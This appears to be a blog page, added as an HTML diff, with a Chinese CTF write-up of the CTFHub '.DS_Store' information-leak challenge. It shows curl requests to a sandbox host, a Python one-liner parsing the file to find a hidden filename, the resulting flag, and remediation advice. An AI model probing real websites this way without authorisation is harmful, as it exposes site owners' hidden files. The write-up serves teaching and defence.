@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub .DS_Store Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 750px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - 信息泄露 - 备份文件下载 - .DS_Store</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># 信息泄露</span>
+            <span class="tag"># 备份文件下载</span>
+            <span class="tag"># .DS_Store</span>
+            <span class="tag"># macOS</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>.DS_Store</li>
+            <li><strong>题目方向：</strong>Web - 信息泄露 - 备份文件下载</li>
+            <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
+            <li><strong>题目提示：</strong>.DS_Store 是 macOS 保存文件夹自定义属性的隐藏文件，可能包含当前目录的文件清单。</li>
+        </ul>
+
+        <h2>二、漏洞原理</h2>
+        <p>macOS Finder 在浏览目录时可能生成 <code>.DS_Store</code> 文件，用于保存图标位置、排序方式等目录元数据。该文件通常还会记录目录中的文件名。</p>
+        <p>如果网站部署时误将 <code>.DS_Store</code> 发布到 Web 根目录，服务器会把它当作普通静态文件返回。攻击者可以下载该文件并解析其中的记录，从而发现未在页面中公开的文件名或其他目录线索。</p>
+
+        <h2>三、解题工具</h2>
+        <ul>
+            <li>浏览器：查看题目提示。</li>
+            <li>cURL：下载 <code>.DS_Store</code> 和其中记录的文件。</li>
+            <li>Python：使用 <code>ds_store</code> 库解析 <code>.DS_Store</code>。</li>
+        </ul>
+
+        <h2>四、解题步骤</h2>
+        <ol>
+            <li>
+                <strong>访问题目：</strong>页面标题为 <code>CTFHub BackUp DS_Store</code>，正文提示寻找 Flag。
+            </li>
+            <li>
+                <strong>下载隐藏文件：</strong>直接请求 Web 根目录下的 <code>.DS_Store</code>，响应返回 <code>200 OK</code> 和 <code>application/octet-stream</code>：
+                <pre>curl.exe -sS "http://challenge-xxx.sandbox.ctfhub.com:10800/.DS_Store" -o .DS_Store</pre>
+            </li>
+            <li>
+                <strong>确认文件格式：</strong>文件大小为 16388 字节，头部包含 <code>Bud1</code> 特征，属于 macOS Desktop Services Store 文件，不是普通文本。
+            </li>
+            <li>
+                <strong>解析目录记录：</strong>安装解析库后遍历文件中的记录：
+                <pre>python -m pip install ds_store
+
+python -c "from ds_store import DSStore; d=DSStore.open('.DS_Store'); [print(e.filename, e.code, e.type, e.value) for e in d]; d.close()"</pre>
+                得到隐藏文件名和对应备注：
+                <pre>('6a224c3de890b87f210914b8e001b79f.txt', b'note', b'ustr', 'flag here!')</pre>
+            </li>
+            <li>
+                <strong>访问泄露文件：</strong>使用解析出的文件名请求目标地址：
+                <pre>curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/6a224c3de890b87f210914b8e001b79f.txt"</pre>
+                响应正文即为 Flag。
+            </li>
+        </ol>
+
+        <h2>五、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{fc1ccead4d74406421fbbd48}
+        </div>
+
+        <h2>六、修复建议</h2>
+        <ul>
+            <li>发布网站前检查构建产物，确保不会打包 <code>.DS_Store</code>、<code>Thumbs.db</code> 等系统隐藏文件。</li>
+            <li>在 Web 服务器或反向代理中禁止访问以 <code>.</code> 开头的文件和敏感备份文件。</li>
+            <li>使用自动化构建与部署流程，只发布明确需要的静态资源，避免直接暴露开发目录。</li>
+            <li>目录清单、内部文件名和调试备注不应作为公开资源部署到生产环境。</li>
+        </ul>
+
+        <h2>七、解题总结</h2>
+        <p>本题的关键是先通过 <code>/.DS_Store</code> 获取目录文件清单，再访问其中记录的隐藏文本文件。题目中的 <code>note</code> 记录还提供了 <code>flag here!</code> 提示，但真正的 Flag 内容位于该记录对应的文件中。</p>
+    </div>
+</body>
+</html>
